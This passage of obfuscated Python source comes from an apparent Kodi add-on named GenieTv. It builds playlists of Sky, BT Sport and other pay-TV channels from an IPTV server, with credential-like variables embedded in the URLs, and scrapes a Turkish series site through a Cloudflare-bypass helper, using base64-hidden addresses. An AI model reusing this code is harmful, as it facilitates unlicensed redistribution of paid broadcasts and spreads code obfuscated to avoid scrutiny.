 oooO00Oo . write ( r'ITV2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F207.m3u8&mode=10012&name=[COLORgreen]ITV2%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'ITV3=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F206.m3u8&mode=10012&name=[COLORgreen]ITV3%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'ITV4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F205.m3u8&mode=10012&name=[COLORgreen]ITV4%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Channel 4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F183.m3u8&mode=10012&name=[COLORgreen]Channel+4%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Channel 5=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F185.m3u8&mode=10012&name=[COLORgreen]Channel+5%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'5STAR=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F187.m3u8&mode=10012&name=[COLORgreen]5%2A%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'5 USA=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F186.m3u8&mode=10012&name=[COLORgreen]5USA%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'RTE One=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F194.m3u8&mode=10012&name=[COLORgreen]RTE+One%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'RTE Two=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F193.m3u8&mode=10012&name=[COLORgreen]RTE+Two%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'TG4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F192.m3u8&mode=10012&name=[COLORgreen]TG4%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F32.m3u8&mode=10012&name=[COLORgreen]Sky+1%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F33.m3u8&mode=10012&name=[COLORgreen]Sky+2%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Living=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F35.m3u8&mode=10012&name=[COLORgreen]Sky+Living%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Atlantic=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F34.m3u8&mode=10012&name=[COLORgreen]Sky+Atlantic%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Dave=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F325.m3u8&mode=10012&name=[COLORgreen]Dave%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Pick=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F324.m3u8&mode=10012&name=[COLORgreen]Pick%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'GOLD=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F326.m3u8&mode=10012&name=[COLORgreen]Gold%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Watch HD=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F518.m3u8&mode=10012&name=[COLORgreen]Watch%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'YESTERDAY=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F377.m3u8&mode=10012&name=[COLORgreen]Yesterday%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Comedy Central=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F181.m3u8&mode=10012&name=[COLORgreen]Comedy+Central%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'London Live=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F830.m3u8&mode=10012&name=[COLORgreen]London+Live%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Disney Junior=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F230.m3u8&mode=10012&name=[COLORgreen]Disney+Jr.%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Disney Chnl=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F231.m3u8&mode=10012&name=[COLORgreen]Disney+Channel%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Animal Planet=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F198.m3u8&mode=10012&name=[COLORgreen]Animal+Planet%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Nat Geo=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F197.m3u8&mode=10012&name=[COLORgreen]National+Geographic+Channel%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Discovery=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F200.m3u8&mode=10012&name=[COLORgreen]Discovery+Channel%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Discovery Science=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F199.m3u8&mode=10012&name=[COLORgreen]Discovery+Science%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Disc.Turbo=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F168.m3u8&mode=10012&name=[COLORgreen]Discovery+Turbo%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Food Network=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F639.m3u8&mode=10012&name=[COLORgreen]Food+Network%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'MTV MUSIC=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F234.m3u8&mode=10012&name=[COLORgreen]MTV+Music%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Film4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F182.m3u8&mode=10012&name=[COLORgreen]Film4%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'True Movies=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F853.m3u8&mode=10012&name=[COLORgreen]True+Movies%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'True Movies 2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F852.m3u8&mode=10012&name=[COLORgreen]True+Movies+2%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Action=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F732.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Action+%26+Adventure%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky ScFiHorror=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F511.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Sci-Fi+%26+Horror%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'SkyPremiereHD=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F516.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Premiere%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Greats=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F512.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Greats%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Family=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F509.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Family%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky DramaRom=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F510.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Drama+%26+Romance%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Thriller=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F514.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Crime+%26+Thriller%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Comedy=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F513.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Comedy%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Showcase=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F46.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Showcase%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Select=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F45.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Select%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Disney=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F195.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Disney%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Sports 1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F18.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+1%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Sports 2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F19.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+2%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Sports 3=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F20.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+3%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Sports 4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F21.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+4%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Sports 5=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F22.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+5%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Sports F1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F24.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+F1%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Sky Sports News=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F23.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+News%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'BT Sport 1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F309.m3u8&mode=10012&name=[COLORgreen]BT+Sport+1%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'BT Sport 2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F26.m3u8&mode=10012&name=[COLORgreen]BT+Sport+2%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'BT Sport Europe=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F705.m3u8&mode=10012&name=[COLORgreen]BT+Sport+Europe%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'BT Sport ESPN=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F28.m3u8&mode=10012&name=[COLORgreen]BT+Sport+ESPN%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Box Nation=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F173.m3u8&mode=10012&name=[COLORgreen]Box+Nation%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'WWENetwork=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F178.m3u8&mode=10012&name=[COLORgreen]WWENetwork%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Eurosport=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F269.m3u8&mode=10012&name=[COLORgreen]Eurosport+1%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Eurosport 2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F748.m3u8&mode=10012&name=[COLORgreen]Eurosport+2%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'At The Races=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F170.m3u8&mode=10012&name=[COLORgreen]At+the+Races%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Racing UK=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F171.m3u8&mode=10012&name=[COLORgreen]Racing+UK%0D[%2FCOLOR]' + '\n' )
 oooO00Oo . write ( r'Poker central US=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F826.m3u8&mode=10012&name=[COLORgreen]Poker+central+US%0D[%2FCOLOR]' + '\n' )
 if 9 - 9: oOO + OoOoOO00 % oOO % iI1Ii11iII1 + iIii1I11I1II1
 if 59 - 59: i1IIi
 if 48 - 48: O0 * oO0O * Ooo00oOo00o . Ooo00oOo00o * OOoo0OO0 - oO0O
def iIi11i ( ) :
 if 56 - 56: i11iIiiIii . oOO / II1i1IiiIIi11
 iIiIIIi ( '[COLORgreen]Recent Episodes[/COLOR]' , '' , 10019 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Genres[/COLOR]' , '' , 10020 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Search[/COLOR]' , '' , 10021 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 if 48 - 48: Ooo00oOo00o * i11i1 + iIii1I11I1II1 / OoOoOO00
def oOO0OO0oOO ( ) :
 if 85 - 85: O0
 IIi1IIIi = cloudflare . source ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29t' ) )
 IiI11iII1 = re . compile ( '<li id=".+?">.+?<a href="(.+?)">.+?<img width="40" height="40" src="(.+?)" alt=""/>.+?<span class="title">\n(.+?)</span>.+?<span class="alt-title">\n(.+?)</span>.+?</a>.+?</li>' , re . DOTALL ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , IIIIiI11I11 , oO00oooOOoOo0 , OoOOoOooooOOo in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 + '  -  ' + ( OoOOoOooooOOo ) . replace ( 'sezon' , 'Season' ) . replace ( 'bölüm' , 'Episode' ) , ooooO0oOoOOoO , 10023 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
  if 32 - 32: OoooooooOO . Ooo00oOo00o / Oo * OOooOOo / OOooOOo * oO0O
  if 19 - 19: oO0O
  if 55 - 55: i11i1 % i11i1 / O0 % II1i1IiiIIi11 - OOooOOo . Oo
def iiiii1I1III1 ( ) :
 if 12 - 12: II1i1IiiIIi11 . I1IiI * OOOo0
 iIiIIIi ( '[COLORgreen]Action[/COLOR]' , 'Aksiyon' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Adventure[/COLOR]' , 'Macera' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Animation[/COLOR]' , 'Animasyon' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Anime[/COLOR]' , 'Anime' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Biography[/COLOR]' , 'Biyografi' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Comedy[/COLOR]' , 'Komedi' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Crime[/COLOR]' , 'Su%C3%A7' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Documentary[/COLOR]' , 'Belgesel' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Drama[/COLOR]' , 'Dram' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Family[/COLOR]' , 'Aile' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Fantasy[/COLOR]' , 'Fantastik' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]History[/COLOR]' , 'Tarih' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Horror[/COLOR]' , 'Korku' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Mini-Series[/COLOR]' , 'Mini%20Dizi' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Musical[/COLOR]' , 'M%C3%BCzikal' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Mystery[/COLOR]' , 'Gizem' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Romance[/COLOR]' , 'Romantik' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Science Fiction[/COLOR]' , 'Bilim%20Kurgu' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Sport[/COLOR]' , 'Spor' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Thriller[/COLOR]' , 'Gerilim' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]War[/COLOR]' , 'Sava%C5%9F' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Western[/COLOR]' , 'Tarih' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Youth[/COLOR]' , 'Gen%C3%A7lik' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 if 37 - 37: ii11ii1ii * OOOo0 % i11iIiiIii % i1IIi % iI1Ii11iII1
def iiiO0 ( url ) :
 i1II1 = 'http://dizilab.com/arsiv?limit=100&tur=' + url + '&orderby=&ulke=&order=&yil=&dizi_adi='
 Oo0oO00o = cloudflare . source ( i1II1 )
 IiI11iII1 = re . compile ( '<div class="tv-series-single">.+?<a href="(.+?)" class="film-image">.+?<img src="(.+?)" alt=""/>.+?<span class="position">.+?</span>\n(.+?)</a>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , url , 10022 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
  if 76 - 76: iIii1I11I1II1
  if 80 - 80: iIii1I11I1II1 . O0 / oO0O % oO0O
  if 93 - 93: OoooooooOO * Oo
  if 10 - 10: I1I1ii * OoooooooOO + OOoo0OO0 - ii11ii1ii / ii11ii1ii . i11iIiiIii
def i1I1i ( ) :
 if 22 - 22: Oo % Ooo00oOo00o - OoooooooOO * Oo
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 o0Oo0oO0oOO00 = iiI11iI . lower ( )
 ooooO0oOoOOoO = ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29tL2Fyc2l2P2xpbWl0PSZ0dXI9Jm9yZGVyYnk9JnVsa2U9Jm9yZGVyPSZ5aWw9JmRpemlfYWRpPQ==' ) ) + ( iiI11iI ) . replace ( ' ' , '+' )
 Oo0oO00o = cloudflare . source ( ooooO0oOoOOoO )
 IiI11iII1 = re . compile ( '<a href="(.+?)" class="film-image">\n<img src="(.+?)" alt=""/>\n</a>\n<div class="tss-detail">\n<a class="title" style="" href=".+?">\n<span class="position">.+?</span>\n(.+?)</a>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  if iiI11iI in oO00oooOOoOo0 . lower ( ) :
   iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ooooO0oOoOOoO , 10022 , ii11iIi1I + 'dtv.png' )
   if 38 - 38: iIii1I11I1II1 / oOO
   if 13 - 13: iIii1I11I1II1
   if 77 - 77: i11iIiiIii - iIii1I11I1II1 / Ooo0OO0oOO / oOO / Ooo00oOo00o
def ooo0O0o0OoOO ( url ) :
 Oo0oO00o = cloudflare . source ( url )
 IiI11iII1 = re . compile ( '<a class="season" href="(.+?)">\n(.+?)\n</a>.+?<a class="episode" href=".+?">\n(.+?)\n</a>.+?<a class="episode-name" href=".+?">\n(.+?)</a>' , re . DOTALL ) . findall ( Oo0oO00o )
 for I1III1111iIi , iIi11io0o00o0Oo , OOOOOo , oO00oooOOoOo0 in IiI11iII1 :
  oOOoo = ( OOOOOo ) . replace ( 'Sezon' , '' ) . replace ( 'bölüm' , '' ) . replace ( 'Bölüm' , '' ) . replace ( 'BÃ¶lÃ¼m' , '' ) . replace ( '.' , '' )
  i1I1iIii11 = ( iIi11io0o00o0Oo ) . replace ( 'bölüm' , '' ) . replace ( 'Sezon' , '' ) . replace ( 'Bölüm' , '' ) . replace ( 'BÃ¶lÃ¼m' , '' ) . replace ( '.' , '' )
  oOoO0O0oO = 'Season ' + i1I1iIii11 + 'Episode ' + oOOoo + oO00oooOOoOo0
  oOOoO ( oOoO0O0oO , I1III1111iIi )
  if 87 - 87: I1IiI % iIii1I11I1II1
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 72 - 72: i11i1 . i11i1 - ii11ii1ii
  if 48 - 48: Oo - oOO + Oo - OOOo0 * i11iIiiIii . II1i1IiiIIi11
def oOOoO ( name , url ) :
 I1III1111iIi = url
 I1iIIIiI = name
 oOIIiIi = cloudflare . source ( I1III1111iIi )
 IIII11I1I = re . compile ( 'file: "(.+?)",.+?label: "(.+?)",' , re . DOTALL ) . findall ( oOIIiIi )
 for OOoOooOoOOOoo , OoiI1I1 in IIII11I1I :
  I1i1iii1Ii ( '[COLORgreen]' + I1iIIIiI + OoiI1I1 + '[/COLOR]' , OOoOooOoOOOoo , 10012 , ii11iIi1I + 'dtv.png' )
  if 27 - 27: oOO - Oo + II1i1IiiIIi11 - i11i1 . OOOo0
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 51 - 51: Ooo0OO0oOO + Ooo00oOo00o + II1i1IiiIIi11 + II1i1IiiIIi11 % OOooOOo
 if 29 - 29: oOO
def ii1iIi1Ii1 ( ) :
 if 66 - 66: Ooo00oOo00o % OOooOOo
 if 21 - 21: I1IiI - OoooooooOO % i11iIiiIii
